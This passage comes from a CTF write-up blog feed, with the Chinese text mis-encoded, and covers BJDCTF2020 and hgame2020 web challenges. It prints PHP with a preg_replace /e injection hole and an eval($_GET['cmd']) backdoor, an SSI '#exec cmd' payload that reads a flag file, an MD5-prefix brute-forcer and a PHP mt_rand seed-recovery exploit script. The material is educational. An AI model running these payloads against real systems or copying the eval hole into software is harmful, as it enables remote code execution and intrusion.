dream&lt;/h1&gt;&lt;/br&gt;PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K</span><br></pre></td></tr></table></figure><p>base64è§£ç åå¾—åˆ°<code>next.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¬¬8è¡Œï¼Œ<code>preg_replace</code>å‡½æ•°å¼€å¯äº†<code>e</code>æ¨¡å¼ï¼Œæ ¹æ®phpå®˜ç½‘å¯¹eæ¨¡å¼çš„æè¿°å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœè®¾ç½®äº†è¿™ä¸ªè¢«å¼ƒç”¨çš„ä¿®é¥°ç¬¦ï¼Œ preg_replace() åœ¨è¿›è¡Œäº†å¯¹æ›¿æ¢å­—ç¬¦ä¸²çš„ åå‘å¼•ç”¨æ›¿æ¢ä¹‹å, å°†æ›¿æ¢åçš„å­—ç¬¦ä¸²ä½œä¸ºphp ä»£ç è¯„ä¼°æ‰§è¡Œ(eval å‡½æ•°æ–¹å¼)ï¼Œå¹¶ä½¿ç”¨æ‰§è¡Œç»“æœ ä½œä¸ºå®é™…å‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œçº¿(\)å’Œ NULL å­—ç¬¦åœ¨ åå‘å¼•ç”¨æ›¿æ¢æ—¶ä¼šè¢«ç”¨åæ–œçº¿è½¬ä¹‰.</span><br></pre></td></tr></table></figure><p>è™½ç„¶ç¬¬äºŒä¸ªå‚æ•°æ²¡æœ‰å¯æ§çš„åœ°æ–¹</p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>æ‰«æåå‘ç°å­˜åœ¨<code>index.php.swp</code>ï¼Œå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">function get_hash()&#123;</span><br><span class="line">$chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&apos;;</span><br><span class="line">$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times</span><br><span class="line">$content = uniqid().$random;</span><br><span class="line">return sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">***</span><br><span class="line">    if(isset($_POST[&apos;username&apos;]) and $_POST[&apos;username&apos;] != &apos;&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &apos;6d0bc1&apos;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&apos;password&apos;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;[+] Welcome to manage system&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &apos;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&apos;.$_POST[&apos;username&apos;].&apos;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&apos;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;[!] Failed&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç®€å•çš„ssiæ³¨å…¥æ¼æ´ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ‰“å°±å¥½äº†ï¼Œå…·ä½“å¯ä»¥å‚è€ƒæˆ‘çš„è¿™ç¯‡æ–‡ç« <a href="https://0clickjacking0.github.io/2019/09/13/ssiæ¼æ´å°ç»“/">ssiæ¼æ´å°ç»“</a></p><p>çˆ†ç ´md5çš„è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">list = string.digits+string.ascii_letters</span><br><span class="line">input_md5 = input(<span class="string">'è¯·è¾“å…¥md5å€¼ï¼š'</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> list:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> list:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> list:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> list:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> list:<span class="comment">#5ä½æ•°</span></span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> list:  <span class="comment"># 6ä½æ•°</span></span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> list:  <span class="comment"># 7ä½æ•°</span></span><br><span class="line">                            str4=(a+b+c+d+e+f+g)</span><br><span class="line">                            value = hashlib.md5(str4.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                            value1 = value.hexdigest()</span><br><span class="line">                            <span class="comment">#print (value1)</span></span><br><span class="line">                            s4 = value1[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                            <span class="comment"># print (s1)</span></span><br><span class="line">                            <span class="keyword">if</span> s4 == input_md5:<span class="comment">#å†™å…¥ä»é¡µé¢ä¸­è·å–6ä½æ•°</span></span><br><span class="line">                                <span class="keyword">print</span> (str4)</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2 &quot;--&gt;&amp;password=000e6wc</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®è¿”å›å¤´<code>Url_is_here</code>è¿”å›çš„é“¾æ¥å³å¯å¾—åˆ°flag</p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç”±äºä¸æ˜¯æœ¬æ ¡å­¦ç”Ÿï¼Œæ‰€ä»¥æˆ‘åœ¨&lt;a href=&quot;https://buuoj.cn/challenge&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;å¤ç°äº†ä¸€æ³¢&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2020-Level-Week3_Web_writeup</title>
    <link href="http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/"/>
    <id>http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/</id>
    <published>2020-02-04T04:28:22.000Z</published>
    <updated>2020-02-28T12:21:42.474Z</updated>
    
    <content type="html"><![CDATA[<p>hgame2020-Level-Week3_Web_writeup</p><a id="more"></a><h2 id="äºŒå‘å…¥é­‚ï¼"><a href="#äºŒå‘å…¥é­‚ï¼" class="headerlink" title="äºŒå‘å…¥é­‚ï¼"></a>äºŒå‘å…¥é­‚ï¼</h2><p>è¿™é‡Œå…·ä½“å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼Œ<a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">BREAKING PHPâ€™S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE</a>ï¼ŒåŸç†å¾ˆä¸é”™ï¼Œå€¼å¾—ç ”ç©¶ã€‚</p><p>æŠŠä¸‹é¢ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹</p><p><code>reverse_mt_rand.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.6</span></span><br><span class="line"><span class="comment"># Charles Fol</span></span><br><span class="line"><span class="comment"># @cfreal_</span></span><br><span class="line"><span class="comment"># 2020-01-04 (originally la long time ago ~ 2010)</span></span><br><span class="line"><span class="comment"># Breaking mt_rand() with two output values and no bruteforce.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">R = final rand value</span></span><br><span class="line"><span class="string">S = merged state value</span></span><br><span class="line"><span class="string">s = original state value</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">N = <span class="number">624</span></span><br><span class="line">M = <span class="number">397</span></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">0xffffffff</span></span><br><span class="line">MOD = MAX + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># STATE_MULT * STATE_MULT_INV = 1 (mod MOD)</span></span><br><span class="line">STATE_MULT = <span class="number">1812433253</span></span><br><span class="line">STATE_MULT_INV = <span class="number">2520285293</span></span><br><span class="line"></span><br><span class="line">MT_RAND_MT19937 = <span class="number">1</span></span><br><span class="line">MT_RAND_PHP = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="string">"""Creates the initial state array from a seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    state = [<span class="keyword">None</span>] * N</span><br><span class="line">    state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">        r = state[i - <span class="number">1</span>]</span><br><span class="line">        state[i] = (STATE_MULT * (r ^ (r &gt;&gt; <span class="number">30</span>)) + i) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_initialize</span><span class="params">(s, p)</span>:</span></span><br><span class="line">    <span class="string">"""From an initial state value `s` at position `p`, find out seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># We have:</span></span><br><span class="line">    <span class="comment"># state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000</span></span><br><span class="line">    <span class="comment"># and:</span></span><br><span class="line">    <span class="comment"># (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)</span></span><br><span class="line">    <span class="comment"># =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(p, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        s = _undo_php_mt_initialize(s, i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_undo_php_mt_initialize</span><span class="params">(s, i)</span>:</span></span><br><span class="line">    s = (STATE_MULT_INV * (s - i)) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> s ^ s &gt;&gt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Converts a merged state value `s1` into a random value, then sent to the</span></span><br><span class="line"><span class="string">    user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Retrieves the merged state value from the value sent to the user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line"></span><br><span class="line">    s1 = undo_lshift_xor_mask(s1, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line"></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">11</span></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_lshift_xor_mask</span><span class="params">(v, shift, mask)</span>:</span></span><br><span class="line">    <span class="string">"""r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(shift, <span class="number">32</span>, shift):</span><br><span class="line">        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span><span class="params">(v, start, size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lobits(v &gt;&gt; start, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lobits</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; (<span class="number">1</span> &lt;&lt; b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bv</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bit(v, b) &gt;&gt; b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span><span class="params">(state, flavour)</span>:</span></span><br><span class="line">    s = state</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, N - M):</span><br><span class="line">        s[i] = _twist_php(s[i + M], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N - M, N - <span class="number">1</span>):</span><br><span class="line">        s[i] = _twist_php(s[i + M - N], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_twist_php</span><span class="params">(m, u, v, flavour)</span>:</span></span><br><span class="line">    <span class="string">"""Emulates the `twist` and `twist_php` #defines.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span> <span class="keyword">if</span> (u <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">else</span> v) &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> m ^ (((u &amp; <span class="number">0x80000000</span>) | (v &amp; <span class="number">0x7FFFFFFF</span>)) &gt;&gt; <span class="number">1</span>) ^ mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_reload</span><span class="params">(S000, S227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))</span></span><br><span class="line">    <span class="comment"># m S000</span></span><br><span class="line">    <span class="comment"># u S227</span></span><br><span class="line">    <span class="comment"># v S228</span></span><br><span class="line">    X = S000 ^ S227</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This means the mask was applied, and as such that S227's LSB is 1</span></span><br><span class="line">    s22X_0 = bv(X, <span class="number">31</span>)</span><br><span class="line">    <span class="comment"># remove mask if present</span></span><br><span class="line">    <span class="keyword">if</span> s22X_0:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Another easy guess</span></span><br><span class="line">    s227_31 = bv(X, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># remove bit if present</span></span><br><span class="line">    <span class="keyword">if</span> s227_31:</span><br><span class="line">        X ^= <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We're missing bit 0 and bit 31 here, so we have to try every possibility</span></span><br><span class="line">    s228_1_30 = (X &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> s228_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> s228_31 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_MT19937 <span class="keyword">and</span> s22X_0 != s228_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s228 = s228_0 | s228_31 &lt;&lt; <span class="number">31</span> | s228_1_30</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the results are consistent with the known bits of s227</span></span><br><span class="line">            s227 = _undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">and</span> bv(s227, <span class="number">0</span>) != s22X_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> bv(s227, <span class="number">31</span>) != s227_31:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the guessed seed yields S000 as its first scrambled state</span></span><br><span class="line">            rand = undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            state = php_mt_initialize(rand)</span><br><span class="line">            php_mt_reload(state, flavour)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (S000 == state[offset]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> rand</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(_R000, _R227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># Both were &gt;&gt; 1, so the leftmost byte is unknown</span></span><br><span class="line">    _R000 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    _R227 &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R000_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> R227_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            R000 = _R000 | R000_0</span><br><span class="line">            R227 = _R227 | R227_0</span><br><span class="line">            S000 = undo_php_mt_rand(R000)</span><br><span class="line">            S227 = undo_php_mt_rand(R227)</span><br><span class="line">            seed = undo_php_mt_reload(S000, S227, offset, flavour)</span><br><span class="line">            <span class="keyword">if</span> seed:</span><br><span class="line">                <span class="keyword">return</span> seed</span><br></pre></td></tr></table></figure><p><code>exp.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from reverse_mt_rand import main</span><br><span class="line">url = &apos;https://twoshot.hgame.n3ko.co&apos;</span><br><span class="line">r = requests.Session()</span><br><span class="line">random_num = r.get(url + &apos;/random.php?times=229&apos;).text</span><br><span class="line">random_num = eval(random_num)</span><br><span class="line">first_arg = random_num[0]</span><br><span class="line">second_arg = random_num[227]</span><br><span class="line">third_arg = 0</span><br><span class="line">end_arg = 0</span><br><span class="line">result = main(first_arg,second_arg,third_arg,end_arg)</span><br><span class="line">print(r.post(url=url+&quot;/verify.php&quot;,data=&#123;&quot;ans&quot;: str(result)&#125;).text)</span><br></pre></td></tr></table></figure><p>è¿è¡Œ<code>exp.py</code>å³å¯å¾—åˆ°flag</p><h2 id="Cosmosçš„ç•™è¨€æ¿-2"><a href="#Cosmosçš„ç•™è¨€æ¿-2" class="headerlink" 